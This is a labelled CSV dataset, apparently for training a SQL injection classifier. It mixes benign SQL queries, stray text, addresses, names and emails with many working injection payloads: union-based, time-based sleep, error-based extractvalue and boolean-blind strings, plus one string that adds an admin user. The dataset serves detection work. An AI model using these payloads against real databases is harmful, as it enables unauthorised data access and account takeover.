Query,Label
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28565 )  ORDER BY meta_id ASC",0
SELECT COUNT ( clean )  FROM influence,0
1' where 6116  =  6116,1
SELECT * FROM sent 3,0
"-9389' where 5713 = 5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",1
"praza algalia de arriba, 188,",0
SELECT safety FROM grow UNION SELECT tales FROM deal ORDER BY thank,0
"1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )",1
A master science fiction,0
SELECT announced ( s )  FROM terrible LEFT JOIN,0
8578,0
"plza. luis cernuda, 88",0
"SELECT Orders.OrderID, Employees.LastName, Employees.FirstNameFROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.EmployeeID ORDER BY Orders.OrderID;",0
""" or isNULL  (  1/0  )   /*",1
"SELECT pencil, mighty+ ', ' + sudden+ ' ' + might+ ', ' + tape AS during  FROM him",0
fregaci5n,0
"-3270"" where 2144 = 2144 or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --",1
bould_rhue2@palomajimenez.ru,0
"-2241   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  6840  =  6840",1
"1"" where 3329  =  3329 or sleep  (  5  )  --",1
-8056  )  )   as botl where 9225 = 9225 or  ( 1182 = 7641 ) *7641--,1
SELECT * FROM fell WHERE engineer NOT LIKE '[basket]%',0
-7369 or 9323 = 9323#,1
SELECT * FROM stream WHERE aware NOT LIKE '[wrapped]%',0
desailly_bosworth@coworkers.gov,0
"SELECT soilID AS ID, muscle AS many FROM band",0
338196000000000,0
"&quot; The abbreviation stands &quot; Colonia Claudia Ara Agrippinensium &quot; , basically amounts &quot; City Roman Law City Agrippinians , founded Emperor Claudius Site Altars Imperial Cult &quot;",0
26532,0
beas de segura,0
The entire ground floor suffered damage,0
"SELECT after,magic,trunk,principal,proud     (  (  jar JOIN can ON orbit.shut =  clean.us )   INNER JOIN storyON Orders.develop =  consider.worriedID )",0
"&quot; Finally , let &apos;s talk pumpkins",0
"INSERT INTO grow ( shall, kill, paragraph, spirit, recall, if )  VALUES  ( 'goose', 'speed'. spent', 'lesson', 'season', 'many', 'salmon' )",0
"1""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""jgoq""  =  ""jgoq",1
1 and  ( 3437 = 2271 ) *2271,1
"1""   )    )     )   and 7135  =  8805#",1
"A biosphere area offers chance sustainable economic ecological development basis internationally recognised Unesco status , thus offers extension achieved thus far Life Project previous care days",0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  'pshn' like 'pshn",1
SELECT * FROM swim WHERE ship NOT LIKE '[suppose]%',0
25793872q,0
roquelina,0
SELECT * FROM basic WHERE please BETWEEN '1996-07-01' AND '1996-07-31',0
"1"" where 8978  =  8978 union all select null,null,null,null,null,null,null,null--",1
"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",1
"1'  )   as sjmt where 6541  =  6541 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"1"" )  where 8612 = 8612",1
SELECT * FROM continent FETCH FIRST 3 ROWS ONLY,0
"In case emergency , support provided Königsfeld daytime task force",0
sadoc,0
07831245k,0
condemios de arriba,0
"1'   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   'bacm'  =  'bacm",1
s,1
"Australian diplomats played key role pushing &quot; sustainable development goals &quot; replace MDGs , expire 2015 , ahead UN sustainable development summit began Rio de Janeiro overnight",0
-7999  )   or 8422  =  1336,1
"c/ zamora, 151, 1-b",0
SELECT * FROM gravity,0
SELECT AVG ( victory ) FROM teeth SELECT SUM ( cloud ),0
SELECT * FROM luck FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM daughter,0
"CDC issues children &apos;s allergy guidelines schools On Wednesday , Centers Disease Control Prevention released set guidelines manage children &apos;s food allergies school",0
guerreiro@arroyo-molinos.je,0
SELECT AVG ( load ) FROM mountain SELECT SUM ( write ),0
349,0
rom.val@rpdkorea.eg,0
"SELECT hope,keep,good,bicycle,condition     (  (  excellent JOIN main ON plant.cost =  attention.date )   INNER JOIN lionON Orders.disease =  quick.copyID )",0
select  ( case when  ( 2501 = 4688 )  then 2501 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1
SELECT * FROM sitting WHERE business = 'clay'  AND  ( run = 'upon' OR similar = 'hurry' ),0
"1"" order by 1--",1
5e56ir2,0
"1%""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""%""  =  """,1
SELECT * FROM wp_posts WHERE ID  =  347687 LIMIT 1,0
1 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # yoch,1
"-2605%'  )  )   )  union all select 4738,4738#",1
ladronzue_lo,0
1%'  )   waitfor delay '0:0:5' and   (  '%'  =  ',1
-8963 )  where 8528 = 8528 or  ( 2470 = 3271 ) *3271--,1
29763219t,0
79564193v,0
"nudo josefa ramos de la orden 110,",0
montanuy,0
"SELECT even, bus+ ', ' + shoulder+ ' ' + flew+ ', ' + there AS oil  FROM flight",0
"|| myappadmin.adduser  (  'admin', 'newpass'  )   || '",1
recincho,0
"8 million , also stood around EUR one million projections",0
mclawhor,0
?s,1
"But feminine rage indignation people added, ignorant poor aroused, unintelligent brute force lies bottom society made growl mow, needs habit magnanimity religion treat godlike trifle concernment",0
"1'  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and 'eovg' like 'eovg",1
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and  ( 8535 = 8535",1
1 )  where 1929 = 1929 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno ) --,1
manrique,0
admin'  )   or '1'  =  '1'#,1
"1' )  as eymt where 3911 = 3911 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
"plza. arbol 182, 8?f",0
"1' )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )",1
1' where 6583 = 6583,1
vannuchhi_ecoffery@hotelesjerez.vc,0
SELECT * FROM increase WHERE duck NOT BETWEEN 'position' AND 'decide',0
robby7,0
"Her house located peaceful neighbourhood Stuttgart , plenty greenery , old tree population , nice neighbours much traffic",0
This scores maximum points,0
7094785480687274,0
manciles,0
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1
1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  '%'  =  ',1
"calle somontin 154, 3a",0
"-5026' where 7324  =  7324 union all select 7324,7324--",1
"-4350""   )    )    as mmwq where 9801  =  9801 or   (  8520  =  2834  )  *2834--",1
1'  )   as sruz where 6318  =  6318,1
1%'  )  )   and 7160 = 7249--,1
1'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'kkgt'  =  'kkgt,1
"1%""  )   and 8626  =  3626#",1
"Cameron Doerksen , analyst National Bank Financial , lowered rating &quot; sector perform &quot; &quot; outperform &quot; Thursday view stock limited upside next one two quarters",0
SELECT TOP 3 * FROM chart WHERE moment = 'house' SELECT * FROM nearly,0
1   )    )     ),1
SELECT * FROM anywhere WHERE stick = 'bit'  AND City = 'mine',0
"1"" where 7232  =  7232   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1
"1', ( select  ( case when  ( 5217 = 5217 )  then 1 else 5217* ( select 5217 from mysql.db )  end  )  )",1
"-2722""  )   or 4907  =  8126#",1
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_label_2767' LIMIT 1,0
76833580x,0
requena de campos,0
fantaseadora,0
uzaki@23horas.ie,0
"carretera ribas matama 160,",0
SELECT AVG ( radio ) FROM plane SELECT SUM ( coach ),0
"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"During trial , FBI agent testified intelligence reports revealed Patek Pakistan meet bin Laden effort re-establish links South-East Asian terrorist groups al-Qaeda",0
"-5738"" )  as efbn where 8541 = 8541 union all select 8541,8541,8541,8541,8541,8541,8541,8541#",1
SELECT * FROM ride WHERE route NOT LIKE '[older]%',0
To great misunderstood,0
"1""   )    )    and sleep  (  5  )   and    (    (   ""timv""  =  ""timv",1
"-9037%"" union all select 6583#",1
SELECT AVG ( somehow ) FROM make SELECT SUM ( shade ),0
-6165%'  )  )   union all select 5384#,1
"-2759%""  )  )   or 7769 = 1249#",1
shupe,0
SELECT TOP 50 PERCENT * FROM am,0
( select  ( case when  ( 1421 = 1421 )  then 1 else 1421* ( select 1421 from master..sysdatabases )  end  )  ),1
1'   )    )    as dqdv where 8126  =  8126 and 4595  =  4595#,1
SELECT * FROM graph WHERE tower = 'actual'  AND  ( gas = 'these' OR yard = 'eat' ),0
"SELECT * FROM transportation WHERE failed IN  ( 'fish', 'record', 'happy' )",0
"1""   )    )    as qqhm where 7182  =  7182",1
cocina_r,0
"-9854%""   )    )     )   or 6455  =  3652",1
dearly@evelin.ge,0
4211,0
1  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ),1
"SELECT * FROM easily WHERE kind BETWEEN ""sunlight"" AND    ""till""",0
"travesia olmos, s/n 12e",0
condado de trevio,0
1%'  )  )   )  and 9198 = 9198--,1
SELECT * FROM Suppliers,0
-7746'  )  )   )  or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (   ( 'itxy' like 'itxy,1
hazell,0
frankos,0
"SELECT Employees.adjective, COUNT ( Orders.oceanID )  AS guessFROM    ( OrdersINNER JOIN join ON Orders.deathID  =  Employees.snowID )",0
2300,0
nakanishi@mariposasentudia.ec,0
' or 1 in  ( select @@version ) --,1
Nor types people use pawnbrokers financially stretched,0
ducaux@muchachina.tk,0
7591,0
c944i6a,0
"True , Strathclyde paper pointed possible economic benefits freer movement rest Europe , though - predictably - figure headlines",0
cyril,0
SELECT AVG ( train ) FROM park,0
1%'  )  )   union all select null--,1
"1"" )  and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( ""kkim"" = ""kkim",1
select  ( case when  ( 6435 = 8988 )  then 6435 else 6435* ( select 6435 from information_schema.character_sets )  end ) #,1
2745,0
SELECT option_value FROM wp_options WHERE option_name  =  'wpassetcleanup_post_type_load_exceptions' LIMIT 1,0
1   )    )    as msug where 3503  =  3503 and sleep  (  5  )  #,1
88253687l,0
incrdu69,0
c2is48s0,0
"-5989%"" union all select 3581,3581,3581,3581,3581--",1
"-4044%"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""%""  =  """,1
"select * from users where id = 1 or ""{?"" or 1 = 1 -- 1",1
"INSERT INTO highway  ( cheese, age, pale )  VALUES  ( 'gun', 'mix', 'fast' )",0
SELECT * FROM kill 3 SELECT * FROM blood,0
jean-yve,0
hatajo,0
"SELECT ready, enemy, mice FROM bad WHERE frozen  IS NULL",0
1'+  (  select 'ohdf' where 7878  =  7878 and 5678  =  3277--,1
0570146007146945,0
puchanan-gorin@fulanitoymenganito.lv,0
"-2140  )  )   union all select 8174,8174,8174#",1
alg59za,0
"-6122""  )   union all select 6578,6578--",1
"1' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )",1
bebedizo,0
cr48e24n,0
"-8364' )  union all select 4732,4732,4732,4732,4732,4732,4732,4732,4732#",1
"1'  )   as hvyx where 3194  =  3194 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"passeig bosc, 157",0
gula,0
1'+  (  select ejaj where 1651  =  1651 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  +',1
paracuellos,0
"1'  )   as cgsz where 7194  =  7194 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1
It simply nothing I could imagined,0
schwarz,0
"-3525"" where 3522 = 3522 union all select 3522,3522,3522,3522,3522,3522,3522,3522,3522#",1
"-3872%""   )    )     )   union all select 1637,1637,1637,1637,1637#",1
1 or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #,1
berto,0
1'+  (  select mavu where 4276  =  4276 rlike sleep  (  5  )  #,1
cgi yes sub0202 photo 2 1 yetglezip 71 75 e_qna view eng 25 47817 e_qna eng delete 41 24242 bbs314 129-945,0
"-1908""  )  )   union all select 4072,4072,4072,4072,4072,4072,4072,4072,4072,4072#",1
"1""   )    )    as sqzh where 5672  =  5672 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
1'  )   where 9317  =  9317 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1
5181004596461757,0
docken.carmi@soyrojo.so,0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_cell_number' LIMIT 1,0
"chemical weapons program items contained moved declared sites , inspected",0
"pl. cantarranillas 21,",0
carablanca,0
SELECT AVG ( oldest ) FROM disappear SELECT SUM ( plates ),0
41240,0
"1%'  )  )   )  and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
"1'  )  )   or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and   (  (  'tblb' = 'tblb",1
0957098737909112,0
"1"" )  union all select null,null,null,null--",1
"1""  )  )   )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (   ( ""dwcy"" = ""dwcy",1
"-5595""  )  )   as xttj where 4562 = 4562 union all select 4562,4562,4562,4562,4562#",1
"Gutach: Increased safety pedestrians They even 100 metres apart: On Tuesday , new B 33 pedestrian lights Dorfparkplatz Gutach became operational - within view existing Town Hall traffic lights",0
"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
SELECT stared ( s )  FROM swung UNION,0
SELECT * FROM had 3,0
The fact dog spotted unbelievable,0
"An institution lengthened shadow one man; as, Monachism, Hermit Antony; Reformation, Luther; Quakerism, Fox; Methodism, Wesley; Abolition, Clarkson",0
09069193v,0
"1'||  (  select 'gboi' where 4191  =  4191 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'",1
corulln,0
ansorger,0
One group helpers take care clearance juniper bushes maintenance dry stone wall,0
SELECT AVG ( aware ) FROM ship,0
dugas,0
07901950r,0
"-5478""  )   where 4100  =  4100 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
SELECT * FROM flight 3,0
"-3756' )  union all select 1034,1034,1034--",1
SELECT giving ( s )  FROM this UNION,0
1' )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and  ( 'zqiw' = 'zqiw,1
levitin,0
"(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""plqe""  =  ""plqe",1
"1""  )   as ronb where 9368  =  9368",1
8032,0
"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""zwov""  =  ""zwov",1
"travesia barrionuevo, 49",0
There major reason change anything,0
-9509'  )   where 9303  =  9303 order by 1#,1
"( select * from  ( select ( sleep ( 5  )  )   ) srmq )  and ""wsmz"" like ""wsmz",1
"SELECT LEAST ( ""w3Schools.com"", ""microsoft.com"", ""apple.com"" ) ;",0
SELECT CAST ( 5-10 AS SIGNED ),0
SELECT Count ( * )  AS silk,0
SELECT MIN ( she )  AS shut FROM made,0
